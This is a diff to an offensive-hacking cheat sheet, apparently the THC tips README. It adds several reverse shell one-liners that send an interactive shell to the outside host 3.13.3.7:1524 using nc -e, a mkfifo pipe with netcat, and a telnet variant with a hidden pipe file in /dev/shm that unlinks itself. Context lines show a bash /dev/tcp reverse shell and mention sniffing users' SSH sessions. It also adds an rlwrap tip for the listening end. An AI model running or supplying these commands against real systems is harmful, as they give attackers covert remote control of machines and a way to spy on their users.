@@ -51,6 +51,7 @@ Got tricks? Send them to root@thc.org or submit a pull request.
  8. [Miscellaneous](#misc-anchor)
     1. [Sniff a user's SSH session](#sss-anchor)
     1. [Sniff a user's SSH session without root priviledges](#ssswor-anchor)
+    1. [How to survive high latency connections](#hlc-anchor)
     
    
 
@@ -308,6 +309,12 @@ $ bash -i 2>&1 >&/dev/tcp/3.13.3.7/1524 0>&1
 Especially embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
 
 On the remote system:
+
+```
+$ nc -e /bin/bash -vn 3.13.3.7 1524
+```
+
+Variant if *'-e'* is not supported:
 ```
 $ mkfifo /tmp/.io
 $ sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
@@ -318,6 +325,14 @@ Telnet variant:
 $ mkfifo /tmp/.io
 $ sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
 ```
+
+Telnet variant when mkfifo is not supported (Ulg!):
+```
+$ (touch /dev/shm/.fio; sleep 60; rm -f /dev/shm/.fio) &
+$ tail -f /dev/shm/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/dev/shm/.fio
+```
+Note: Use */tmp/.fio* if */dev/shm* is not available.
+Note: This trick logs your commands to a file. The file will be *unlinked* from the fs after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
 
 <a id="rswpy-anchor"></a>
 **5.i.c. Reverse shell with Python**
@@ -349,19 +364,13 @@ Any of the above reverse shells are limited. For example *sudo bash* or *top* wi
 
 ```
 # Python
-python -c 'import pty; pty.spawn("/bin/bash")'
-
-# Perl
-perl -e 'exec "/bin/bash";'
-
-# Awk
-awk 'BEGIN {system("/bin/bash")}'
+$ python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 <a id="rsup2-anchor"></a>
 **5.ii.b. Upgrade a reverse shell to a fully interactive shell**
 
-...and if we also like to use Ctrl-C we have to go all the way and upgrade the reverse shell to a real fully colorfull interactive shell:
+...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorfull interactive shell:
 
 ```
 # On the target host spwan a PTY using any of the above examples:
@@ -525,7 +534,21 @@ $ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
 
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
+<a id="hlc-anchor"></a>
+**8.iii. How to survive high latency connections**
+
+Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. *rlwrap* comes to the rescue. It buffers all single keystrokes until *Enter* is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...
+
+Example for the receiving end of a revese tunnel:
+```
+$ rlwrap nc -vnlp 1524
+```
+
+Example for *SSH*:
+```
+$ rlwrap ssh user@host
+```
 
 
 ---
-Shoutz: ADM
+Shoutz: ADM, Oscar2020
